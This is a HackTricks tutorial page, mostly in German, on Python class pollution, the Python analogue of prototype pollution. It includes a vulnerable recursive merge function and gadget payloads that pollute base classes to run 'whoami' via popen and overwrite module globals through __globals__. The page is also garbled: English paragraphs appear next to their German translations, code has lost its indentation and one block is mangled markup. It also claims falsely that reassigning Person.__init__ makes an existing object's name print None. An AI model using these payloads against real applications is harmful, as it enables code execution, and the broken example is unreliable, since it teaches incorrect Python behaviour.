# Class Pollution (Python's Prototype Pollution)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Grundlegendes Beispiel

Überprüfen Sie, wie es möglich ist, Klassen von Objekten mit Zeichenketten zu verschmutzen:

```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```

## Grundlegendes Beispiel für eine Schwachstelle

Consider the following Python code:

Betrachten Sie den folgenden Python-Code:

```python
class Person:
    def __init__(self, name):
        self.name = name

person = Person("Alice")
print(person.name)

Person.__init__ = lambda self, name: None

print(person.name)
```

In this code, we have a `Person` class with an `__init__` method that initializes the `name` attribute. We create an instance of the `Person` class called `person` and print the value of the `name` attribute.

In diesem Code haben wir eine `Person`-Klasse mit einer `__init__`-Methode, die das `name`-Attribut initialisiert. Wir erstellen eine Instanz der `Person`-Klasse namens `person` und geben den Wert des `name`-Attributs aus.

However, in the next line, we modify the `__init__` method of the `Person` class to a lambda function that does nothing. We then print the value of the `name` attribute again.

Jedoch ändern wir in der nächsten Zeile die `__init__`-Methode der `Person`-Klasse zu einer Lambda-Funktion, die nichts tut. Anschließend geben wir den Wert des `name`-Attributs erneut aus.

The output of this code will be:

Die Ausgabe dieses Codes wird sein:

```
Alice
None
```

As we can see, after modifying the `__init__` method, the value of the `name` attribute becomes `None`, even though we didn't explicitly change it.

Wie wir sehen können, wird nach der Modifikation der `__init__`-Methode der Wert des `name`-Attributs zu `None`, obwohl wir ihn nicht explizit geändert haben.

This is an example of class pollution or prototype pollution vulnerability in Python. By modifying a class's methods or attributes, an attacker can introduce unexpected behavior or modify the state of an object without the knowledge or consent of the original code.

Dies ist ein Beispiel für eine Klassenverunreinigung oder Prototypenverunreinigung in Python. Durch die Modifikation von Methoden oder Attributen einer Klasse kann ein Angreifer unerwartetes Verhalten einführen oder den Zustand eines Objekts ohne das Wissen oder die Zustimmung des ursprünglichen Codes ändern.

```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```

## Beispiele für Gadgets

<details>

<summary>Erstellen eines Klassenattribut-Standardwerts für RCE (subprocess)</summary>

\`\`\`python from os import popen class Employee: pass # Creating an empty class class HR(Employee): pass # Class inherits from Employee class class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class def execute\_command(self): command = self.custom\_command if hasattr(self, 'custom\_command') else 'echo Hello there' return f'\[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

USER\_INPUT = { "**class**":{ "**base**":{ "**base**":{ "custom\_command": "whoami" } } } }

recruiter\_emp = Recruiter() system\_admin\_emp = SystemAdmin()

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "echo Hello there", output: "Hello there"

## Create default value for Employee.custom\_command

merge(USER\_INPUT, recruiter\_emp)

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "whoami", output: "abdulrah33m"

````
</details>

<details>

<summary>Verschmutzung anderer Klassen und globaler Variablen über <code>globals</code></summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
````

Überprüfen Sie auch die folgende Seite für weitere schreibgeschützte Gadgets:

### Referenzen

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

</details>
